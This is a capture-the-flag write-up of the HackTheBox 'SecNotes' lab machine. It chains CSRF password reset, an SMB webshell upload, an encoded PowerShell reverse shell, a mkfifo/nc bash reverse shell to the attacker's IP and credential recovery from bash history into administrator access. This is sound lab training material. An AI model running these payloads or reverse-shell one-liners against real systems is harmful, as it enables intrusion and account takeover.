---
title: "Secnotes HTB Writeup"
date: 2025-07-28T14:00:00+00:00
description: "SecNotes is a medium difficulty machine, which highlights the risks associated with weak password change mechanisms, lack of CSRF protection and insufficient validation of user input. It also teaches about Windows Subsystem for Linux enumeration."
tags: ["ethical hacking", "tools", "beginner"]
categories: ["writeups","HTB","Boxes","web security"]
author: "Anirudh Ajithkumar"
showToc: true
TocOpen: true
draft: false
---

# Secnotes HTB Writeup

Initially we start off this box by doing an nmap scan. And we get the following results

```bash
┌──(kali㉿kali)-[~/HTB/secnotes]
└─$ sudo nmap -sCV -A 10.10.10.97 | tee nmap
[sudo] password for kali:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-13 19:02 IST
Nmap scan report for 10.10.10.97
Host is up (0.66s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
445/tcp open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP (85%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: Microsoft Windows XP SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: mean: 2h20m06s, deviation: 4h02m32s, median: 4s
| smb2-time:
|   date: 2024-08-13T13:33:35
|_  start_date: N/A
| smb-os-discovery:
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2024-08-13T06:33:33-07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   661.67 ms 10.10.16.1
2   895.07 ms 10.10.10.97

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.53 seconds

```

We have port 80 and 445. The box is not an Active Directory it seems. We can check for null user authentication in the smb but its disabled. So , lets move on with the website

![image1.png](/assets/images/secnotes/image1.png)

This the home page. Lets move on and signup for a user account. After signing up with a user , we are greeted with this dashboard

![image2.png](/assets/images/secnotes/image2.png)

A note making website. Interesting. We can see that we got a possible user in the machine “tyler”. For me the new note section was quite interesting as it allowed us to make notes. Lets check it out

As a natural curiosity, i passed in an html “<h1>hello</h1>” into the notes section

![image3.png](/assets/images/secnotes/image3.png)

And as hoped , we got the desired results once it got rendered

![image4.png](/assets/images/secnotes/image4.png)

The hello has got enlarged. So we have a confirmed XSS. But now what can we do with it. Lets look into other functionality.

For a while I messed around with contact us and change password functionality and found out that a url that is passed into the contact us page is visited by the server.

```bash
┌──(kali㉿kali)-[~/HTB/secnotes]
└─$ nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.97] 59896
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17134.228
Host: 10.10.16.4:8000
Connection: Keep-Alive
```

Also the Change Password functionality was vulnerable as we could also use a GET request to send passwords to reset it.

![image5.png](/assets/images/secnotes/image5.png)

As we can see , we were able to update our password using a GET request. Now its time to chain the exploits. Either we can create a malicious html page that contains an iframe to the password reset page , which we can make the user tyler visit and reset his password, or a simpler way would be to simply pass the whole url into the contact us page. I will do the latter

So we pass this URL to the contact us page

```bash
http://10.10.10.97/change_pass.php?password=aaaaaa&confirm_password=aaaaaa&submit=submit
```

After we wait for a minute, we try to login with the pass, and as we expected it worked. I was able to login as tyler

![image6.png](/assets/images/secnotes/image6.png)

We can see that we have possibly obtained an SMB cred. Lets use crackmapexec and investigate

```bash
┌──(kali㉿kali)-[~/HTB/secnotes]
└─$ crackmapexec smb 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' --shares
SMB         10.10.10.97     445    SECNOTES         [*] Windows 10 Enterprise 17134 (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True)
SMB         10.10.10.97     445    SECNOTES         [+] SECNOTES\tyler:92g!mA8BGjOirkL%OG*&
SMB         10.10.10.97     445    SECNOTES         [+] Enumerated shares
SMB         10.10.10.97     445    SECNOTES         Share           Permissions     Remark
SMB         10.10.10.97     445    SECNOTES         -----           -----------     ------
SMB         10.10.10.97     445    SECNOTES         ADMIN$                          Remote Admin
SMB         10.10.10.97     445    SECNOTES         C$                              Default share
SMB         10.10.10.97     445    SECNOTES         IPC$                            Remote IPC
SMB         10.10.10.97     445    SECNOTES         new-site        READ,WRITE
```

We have access to new-site share. Let enumerate it.

```bash
┌──(kali㉿kali)-[~/HTB/secnotes]
└─$ smbclient //10.10.10.97/new-site -U 'tyler'
Password for [WORKGROUP\tyler]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Aug 13 22:46:33 2024
  ..                                  D        0  Tue Aug 13 22:46:33 2024
  iisstart.htm                        A      696  Thu Jun 21 20:56:03 2018
  iisstart.png                        A    98757  Thu Jun 21 20:56:03 2018

		7736063 blocks of size 4096. 3391642 blocks available
smb: \>
```

I was stuck at this dead-end for a while thinking what to do next. Since the files do belong to a website (most probably being an IIS server) , i decided to redo my nmap scan

```bash
┌──(kali㉿kali)-[~/HTB/secnotes]
└─$ nmap -p- -T5 --max-retries=0 -v 10.10.10.97
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-13 22:59 IST
Initiating Ping Scan at 22:59
Scanning 10.10.10.97 [2 ports]
Completed Ping Scan at 22:59, 0.24s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:59
Completed Parallel DNS resolution of 1 host. at 22:59, 0.01s elapsed
Initiating Connect Scan at 22:59
Scanning 10.10.10.97 [65535 ports]
Discovered open port 80/tcp on 10.10.10.97
Warning: 10.10.10.97 giving up on port because retransmission cap hit (0).
Discovered open port 445/tcp on 10.10.10.97
Connect Scan Timing: About 11.57% done; ETC: 23:04 (0:03:57 remaining)
Connect Scan Timing: About 27.49% done; ETC: 23:03 (0:02:41 remaining)
Discovered open port 8808/tcp on 10.10.10.97
Connect Scan Timing: About 30.93% done; ETC: 23:04 (0:03:23 remaining)
```

Interesting , port 8808 is open. Lets enumerate it further using nmap

```bash
┌──(kali㉿kali)-[~/HTB/secnotes]
└─$ sudo nmap -sCV -p8808 -A 10.10.10.97
[sudo] password for kali:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-13 23:03 IST
Nmap scan report for 10.10.10.97
Host is up (0.47s latency).

PORT     STATE SERVICE VERSION
8808/tcp open  http    Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0

```

As expected , it is the IIS httpd server. Lets open it in the browser

![image7.png](/assets/images/secnotes/image7.png)

Cool , the iistart.png does belong to this IIS server. Since we know the box accepts PHP , we can upload a php webshell do get our job done. Remember we have write access to the share

After modifying the webshell for our needs. We can upload it in the following way

```bash
smb: \> put web-shell.php
putting file web-shell.php as \web-shell.php (1.7 kb/s) (average 1.7 kb/s)
smb: \>
```

And after visting the endpoint , we do get an RCE

![image8.png](/assets/images/secnotes/image8.png)

Cool now lets pass a powershell reverse shell to get the job done

```bash
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANAAiACwAOQA5ADkAOQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

Now after waiting for a few seconds , we get a connect reply

```bash
┌──(kali㉿kali)-[~/HTB/secnotes]
└─$ rlwrap -cAr nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.97] 63784
ls

    Directory: C:\inetpub\new-site

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        8/13/2024  10:57 AM                Microsoft
-a----        6/21/2018   8:26 AM            696 iisstart.htm
-a----        6/21/2018   8:26 AM          98757 iisstart.png
-a----        8/13/2024  10:57 AM            347 php-reverse-shell.php

PS C:\inetpub\new-site>
```

The user flag can be found under C:\Users\tyler\Desktop

Now one of the files in the Desktop folder looked out of place

```bash
PS C:\Users\tyler\Desktop> ls

    Directory: C:\Users\tyler\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/22/2018   3:09 AM           1293 bash.lnk
-a----         8/2/2021   3:32 AM           1210 Command Prompt.lnk
-a----        4/11/2018   4:34 PM            407 File Explorer.lnk
-a----        6/21/2018   5:50 PM           1417 Microsoft Edge.lnk
-a----        6/21/2018   9:17 AM           1110 Notepad++.lnk
-ar---        8/13/2024   5:59 AM             34 user.txt
-a----        8/19/2018  10:59 AM           2494 Windows PowerShell.lnk
```

bash.lnk. Feeling something was off about it , i decided to inspect the content

```bash
L?F w??????V?	?v(???	??9P?O? ?:i?+00?/C:\V1?LIWindows@	???L???LI.h???&WindowsZ1?L<System32B	???L???L<.p?k?System32Z2??LP? bash.exeB	???L<??LU.?Y????bash.exeK-J????C:\Windows\System32\bash.exe"..\..\..\Windows\System32\bash.exeC:\Windows\System32?%?
                     ?wN?�?]N?D.??Q???`?Xsecnotesx?<sAA??????o?:u??'?/?x?<sAA??????o?:u??'?/?=	?Y1SPS?0??C?G????sf"=dSystem32 (C:\Windows)?1SPS??XF?L8C???&?m?q/S-1-5-21-1791094074-1363918840-4199337083-1002?1SPS0?%??G�??`????%
	bash.exe@??????
                       ?)
                         Application@v(???	?i1SPS?jc(=?????O??MC:\Windows\System32\bash.exe91SPS?mD??pH?H@.?=x?hH?(?bP
```

bash.exe. Now thats very interesting. So i tried to execute it and yes we can execute bas commands

For some reason i was unable to a get a stable tty, But i was able to execute commands using the -c switch and found out i was running as the root user

```bash
PS C:\Users\tyler\Desktop> bash -c 'whoami'
root
PS C:\Users\tyler\Desktop>
```

So without further ado , i used a revshell one liner to investigate it even further.

I used the classic :

```bash
PS C:\Users\tyler\Desktop> bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.4 8888 >/tmp/f'
```

And yes , i got a connection back

```bash
┌──(kali㉿kali)-[~/HTB/secnotes]
└─$ rlwrap -cAr nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.97] 64425
root@SECNOTES:~# whoami
whoami
root
root@SECNOTES:~#
```

Cool , after enumerating further , i tried to access the Administrator folder , but i was blocked.

Then i investigated the root folder and upon reading the contents present within the folder , i got his juicy info from the bash history file

```bash
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
```

So we can now use this password and login as Administrator into the box

```bash
┌──(kali㉿kali)-[~/HTB/secnotes]
└─$ smbclient //10.10.10.97/C$ -U 'Administrator'
Password for [WORKGROUP\Administrator]:
Try "help" to get a list of possible commands.
smb: \> ls
  $Recycle.Bin                      DHS        0  Fri Jun 22 03:54:29 2018
  bootmgr                          AHSR   395268  Fri Jul 10 16:30:31 2015
  BOOTNXT                           AHS        1  Fri Jul 10 16:30:31 2015
  Config.Msi                        DHS        0  Mon Jan 25 20:54:50 2021
  Distros                             D        0  Fri Jun 22 03:37:52 2018
  Documents and Settings          DHSrn        0  Fri Jul 10 17:51:38 2015
  inetpub                             D        0  Fri Jun 22 07:17:33 2018
  Microsoft                           D        0  Sat Jun 23 02:39:10 2018
  pagefile.sys                      AHS 738197504  Tue Aug 13 18:28:20 2024
  PerfLogs                            D        0  Thu Apr 12 05:08:20 2018
  php7                                D        0  Thu Jun 21 20:45:24 2018
  Program Files                      DR        0  Tue Jan 26 16:09:51 2021
  Program Files (x86)                DR        0  Tue Jan 26 16:08:26 2021
  ProgramData                        DH        0  Mon Aug 20 03:26:49 2018
  Recovery                         DHSn        0  Fri Jun 22 03:22:17 2018
  swapfile.sys                      AHS 16777216  Tue Aug 13 18:28:20 2024
  System Volume Information         DHS        0  Fri Jun 22 03:23:13 2018
  Ubuntu.zip                          A 201749452  Fri Jun 22 03:37:28 2018
  Users                              DR        0  Fri Jun 22 03:30:39 2018
  Windows                             D        0  Tue Jan 26 16:08:46 2021

		7736063 blocks of size 4096. 3386408 blocks available

```

Cool. The root flag can be found in the Administrators Desktop.

Also we can see why there a bash present in the box. It has WSL present in it. Overall it was a great box and learned a lot of new attack strategies

Hope this writeup helped you ❤️
